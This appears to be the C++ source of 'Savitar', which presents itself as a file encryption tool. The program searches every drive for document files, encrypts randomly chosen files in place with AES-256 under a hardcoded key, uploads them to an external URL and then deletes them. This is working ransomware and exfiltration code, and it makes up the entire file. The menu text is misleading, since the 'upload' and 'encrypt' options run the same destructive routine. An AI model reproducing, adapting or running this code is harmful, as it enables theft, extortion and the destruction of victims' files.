#include <iostream>
#include <vector>
#include <string>
#include <filesystem>
#include <random>
#include <fstream>
#include <curl/curl.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <thread>
#include <atomic>

class FileProcessor {
public:
    static std::vector<std::string> getAllDrives() {
        std::vector<std::string> drives;
        #ifdef _WIN32
        char drive[4] = "C:\\";
        for (drive[0] = 'A'; drive[0] <= 'Z'; drive[0]++) {
            if (GetDriveTypeA(drive) > 1) {
                drives.push_back(std::string(drive));
            }
        }
        #else
        drives = {"/", "/home", "/usr", "/mnt"};
        #endif
        return drives;
    }

    static std::vector<std::string> findFilesAcrossSystem(const std::vector<std::string>& extensions, bool excludeSystemDirs = true) {
        std::vector<std::string> allMatchedFiles;
        std::vector<std::string> drives = getAllDrives();

        std::vector<std::thread> threads;
        std::atomic<int> totalFilesProcessed{0};

        for (const auto& rootPath : drives) {
            threads.push_back(std::thread([rootPath, &allMatchedFiles, &totalFilesProcessed, &extensions, excludeSystemDirs]() {
                try {
                    auto driveFiles = findFilesByExtension(rootPath, extensions, excludeSystemDirs);
                    allMatchedFiles.insert(allMatchedFiles.end(), driveFiles.begin(), driveFiles.end());
                    totalFilesProcessed += driveFiles.size();
                } catch (const std::exception& e) {
                    std::cerr << "Error searching drive " << rootPath << ": " << e.what() << std::endl;
                }
            }));
        }

        for (auto& th : threads) {
            th.join();
        }

        return allMatchedFiles;
    }

    static bool encryptFileInPlace(const std::string& filePath, const std::string& key) {
        if (!std::filesystem::exists(filePath)) {
            std::cerr << "File does not exist: " << filePath << std::endl;
            return false;
        }

        std::ifstream inFile(filePath, std::ios::binary);
        if (!inFile.is_open()) {
            std::cerr << "Failed to open file: " << filePath << std::endl;
            return false;
        }

        std::string fileContent((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
        inFile.close();

        unsigned char iv[AES_BLOCK_SIZE];
        if (!RAND_bytes(iv, AES_BLOCK_SIZE)) {
            std::cerr << "Failed to generate IV" << std::endl;
            return false;
        }

        std::vector<unsigned char> encryptedContent(fileContent.size() + AES_BLOCK_SIZE);
        int encryptedLen = 0, finalLen = 0;

        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) {
            std::cerr << "Failed to create encryption context" << std::endl;
            return false;
        }

        if (!EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, reinterpret_cast<const unsigned char*>(key.c_str()), iv)) {
            std::cerr << "Failed to initialize encryption" << std::endl;
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }

        if (!EVP_EncryptUpdate(ctx, encryptedContent.data(), &encryptedLen, reinterpret_cast<const unsigned char*>(fileContent.data()), fileContent.size())) {
            std::cerr << "Encryption failed" << std::endl;
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }

        if (!EVP_EncryptFinal_ex(ctx, encryptedContent.data() + encryptedLen, &finalLen)) {
            std::cerr << "Failed to finalize encryption" << std::endl;
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }

        EVP_CIPHER_CTX_free(ctx);

        std::ofstream outFile(filePath, std::ios::binary | std::ios::trunc);
        if (!outFile.is_open()) {
            std::cerr << "Failed to open file for writing: " << filePath << std::endl;
            return false;
        }

        outFile.write(reinterpret_cast<char*>(iv), AES_BLOCK_SIZE);
        outFile.write(reinterpret_cast<char*>(encryptedContent.data()), encryptedLen + finalLen);

        return true;
    }

    static bool uploadFile(const std::string& filePath) {
        CURL* curl = curl_easy_init();
        if (!curl) {
            std::cerr << "Failed to initialize CURL" << std::endl;
            return false;
        }

        struct curl_httppost* formpost = NULL;
        struct curl_httppost* lastptr = NULL;

        curl_formadd(&formpost, &lastptr,
            CURLFORM_COPYNAME, "file",
            CURLFORM_FILE, filePath.c_str(),
            CURLFORM_END);

        curl_easy_setopt(curl, CURLOPT_URL, "http://localhost.com/upload");
        curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);

        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "CURL upload failed: " << curl_easy_strerror(res) << std::endl;
        }

        curl_formfree(formpost);
        curl_easy_cleanup(curl);

        return (res == CURLE_OK);
    }

    static void processRandomFiles(const std::vector<std::string>& allFiles, const std::string& encryptionKey, int numFiles = 10) {
        int selectCount = std::min(numFiles, static_cast<int>(allFiles.size()));

        std::vector<std::string> selectedFiles;
        std::sample(
            allFiles.begin(), allFiles.end(),
            std::back_inserter(selectedFiles),
            selectCount,
            std::mt19937{std::random_device{}()}
        );

        for (const auto& file : selectedFiles) {
            if (encryptFileInPlace(file, encryptionKey)) {
                if (uploadFile(file)) {
                    std::filesystem::remove(file);
                }
            }
        }
    }

private:
    static std::vector<std::string> findFilesByExtension(const std::string& rootPath, const std::vector<std::string>& extensions, bool excludeSystemDirs = true) {
        std::vector<std::string> matchedFiles;
        std::vector<std::string> normalizedExtensions;

        for (const auto& ext : extensions) {
            normalizedExtensions.push_back(toLowercase(ext));
        }

        try {
            for (const auto& entry : std::filesystem::recursive_directory_iterator(rootPath, std::filesystem::directory_options::skip_permission_denied)) {
                if (excludeSystemDirs && isSystemPath(entry.path().string())) {
                    continue;
                }

                if (entry.is_regular_file()) {
                    std::string extension = toLowercase(entry.path().extension().string());
                    if (std::find(normalizedExtensions.begin(), normalizedExtensions.end(), extension) != normalizedExtensions.end()) {
                        matchedFiles.push_back(entry.path().string());
                    }
                }
            }
        }
        catch (const std::filesystem::filesystem_error& e) {
            std::cerr << "Error processing directory " << rootPath << ": " << e.what() << std::endl;
        }

        return matchedFiles;
    }

    static std::string toLowercase(const std::string& str) {
        std::string lowerStr = str;
        std::transform(lowerStr.begin(), lowerStr.end(), lowerStr.begin(), ::tolower);
        return lowerStr;
    }

    static bool isSystemPath(const std::string& path) {
        return path.find("System32") != std::string::npos || path.find("Program Files") != std::string::npos;
    }
};

// Function to print ASCII 
// Function to print ASCII logo with description and author in color
void printLogo() {
    std::cout << "\033[1;31m" // Red for the logo
              << R"(
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
)" 
              << "\033[0m" // Reset color

              << "\033[1;34m" // Blue for the Savitar text
              << R"(
   _____             _ __                
  / ___/____ __   __(_) /_____ ______    
  \__ \/ __ `/ | / / / __/ __ `/ ___/    
 ___/ / /_/ /| |/ / / /_/ /_/ / /        
/____/\__,_/ |___/_/\__/\__,_/_/         

)" 
              << "\033[0m" // Reset color

              << "\033[1;32m" // Green for description
              << "Savitar: A powerful file encryption tool.\n"
              << "\033[0m" // Reset color

              << "\033[1;36m" // Cyan for author
              << "Author: 3than.c137 (brownpanda29)\n"
              << "\033[0m" // Reset color

              << "\033[1;33m" // Yellow for the project link
              << "Project: https://github.com/brownpanda29/savitar\n"
              << "\033[0m" // Reset color
              ;
}


// Main function that interacts with the user
int main() {
    printLogo();

    std::string encryptionKey = "7cbc68e331ca73e35ab687534b237bc83d19ba1e390d5526c1f1cf8687054552";
    std::vector<std::string> extensions = {".txt", ".pdf", ".docx"};
    std::string apiUrl = "http://localhost.com/upload";

    while (true) {
        std::cout << "Choose an option:\n1. Run\n2. Exit\n";
        int choice;
        std::cin >> choice;

        if (choice == 2) {
            std::cout << "Exiting program.\n";
            break;
        }

        if (choice == 1) {
            std::cout << "Searching for files...\n";
            std::vector<std::string> files = FileProcessor::findFilesAcrossSystem(extensions);

            std::cout << "Found the following files:\n";
            for (const auto& file : files) {
                std::cout << file << std::endl;
            }

            char uploadChoice;
            std::cout << "Do you want to upload these files? (y/n): ";
            std::cin >> uploadChoice;

            if (uploadChoice == 'y' || uploadChoice == 'Y') {
                std::cout << "Uploading files...\n";
                FileProcessor::processRandomFiles(files, encryptionKey);

                char encryptChoice;
                std::cout << "Files uploaded. Do you want to encrypt the files? (y/n): ";
                std::cin >> encryptChoice;

                if (encryptChoice == 'y' || encryptChoice == 'Y') {
                    std::cout << "Encrypting files...\n";
                    FileProcessor::processRandomFiles(files, encryptionKey);
                    std::cout << "Encryption complete.\n";
                } else {
                    std::cout << "Exiting program.\n";
                    break;
                }
            }
        }
    }

    return 0;
}
